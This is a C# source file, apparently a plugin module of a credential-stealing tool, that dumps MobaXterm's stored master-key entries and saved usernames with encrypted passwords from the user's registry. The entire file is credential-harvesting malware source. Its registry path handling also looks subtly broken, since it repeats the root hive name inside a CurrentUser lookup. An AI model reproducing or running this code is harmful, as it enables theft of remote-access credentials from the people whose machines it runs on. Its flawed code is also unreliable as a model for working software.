using Microsoft.Win32;
using Plugin.Abstractions48;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Plugin48Dumper
{
    public class clsMobaXtermDumper : clsDumper
    {
        public clsMobaXtermDumper()
        {
            Entry = "xterm";
            Description = "MobaXterm dumper";
            Usage = string.Empty;

            Available = true;
        }

        public class clsCredential
        {
            public string Username;
            public string Password;
        }

        public class clsMasterKey
        {
            public string szHostname { get; set; }
            public string szEncPassword { get; set; }
        }

        public List<clsMasterKey> fnGetMasterKey(int nCount = 100, string szRegex = "")
        {
            List<clsMasterKey> ls = new List<clsMasterKey>();
            int n = 0;

            using (RegistryKey root = Registry.CurrentUser.OpenSubKey("HKEY_CURRENT_USER\\SOFTWARE\\Mobatek\\MobaXterm\\"))
            {
                using (RegistryKey subM = root.OpenSubKey("M"))
                {
                    foreach (string szSubKey in subM.GetSubKeyNames())
                    {
                        string szHostname = szSubKey;
                        string szEncPassword = (string)subM.GetValue(szSubKey);

                        if (n >= nCount)
                            break;

                        if (Regex.IsMatch(szHostname, szRegex))
                        {
                            ls.Add(new clsMasterKey()
                            {
                                szHostname = szHostname,
                                szEncPassword = szEncPassword,
                            });
                        }

                        n++;
                    }
                }
            }

            return ls;
        }

        public List<clsCredential> fnlsDump(int nCount = 100, string szRegex = "")
        {
            List<clsCredential> ls = new List<clsCredential>();
            int n = 0;

            using (RegistryKey root = Registry.CurrentUser.OpenSubKey("HKEY_CURRENT_USER\\SOFTWARE\\Mobatek\\MobaXterm\\"))
            {
                using (RegistryKey subP = root.OpenSubKey("P"))
                {
                    foreach (string szSubKey in subP.GetSubKeyNames())
                    {
                        string szUsername = szSubKey;
                        string szEncPassword = (string)subP.GetValue(szSubKey);

                        if (n >= nCount)
                            break;

                        if (Regex.IsMatch(szUsername, szRegex))
                        {
                            ls.Add(new clsCredential()
                            {
                                Username = szSubKey,
                                Password = szEncPassword,
                            });
                        }

                        n++;
                    }
                }
            }

            return ls;
        }
    }
}
